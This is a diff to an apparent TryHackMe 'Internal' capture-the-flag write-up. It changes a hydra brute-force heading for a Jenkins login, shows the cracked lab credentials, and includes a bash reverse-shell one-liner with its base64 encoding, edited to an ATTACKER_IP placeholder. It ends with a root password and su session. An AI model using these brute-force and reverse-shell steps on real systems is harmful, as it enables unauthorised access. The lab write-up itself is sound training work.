@@ -15,7 +15,7 @@ keywords: [internal, tryhackme, ctf, pentesting, guide, docs, tutorial, enumerat
 
 <br/>
 
-- Brute-Forcing <b style={{ color: 'FireBrick' }}>Jenkins</b> Login-Form: <b style={{ color: 'Chartreuse' }}>admin</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>spongebob</b>
+- Using `hydra` to Brute-Force <b style={{ color: 'FireBrick' }}>Jenkins</b> Login-Form: <b style={{ color: 'Chartreuse' }}>admin</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>spongebob</b>
 
 ```log
 [DATA] attacking http-post-form://10.11.30.40:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid
@@ -36,7 +36,7 @@ keywords: [internal, tryhackme, ctf, pentesting, guide, docs, tutorial, enumerat
 
 ```bash
 +-----------------------------------------------------+    +----------------------------------------------------------------------+
-| bash -c 'bash -i >& /dev/tcp/10.11.30.40/4445 0>&1' | -> | YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4zMC40MC80NDQ1IDA+JjEn |
+| bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' | -> | YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4zMC40MC80NDQ1IDA+JjEn |
 +-----------------------------------------------------+    +----------------------------------------------------------------------+
 ```
 
@@ -71,7 +71,7 @@ root:tr0ub13guM!@#123
 ```bash
 aubreanna@internal:~$ su - root
 Password: 
-root@internal:~# id
+root@internal:~$ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 ---
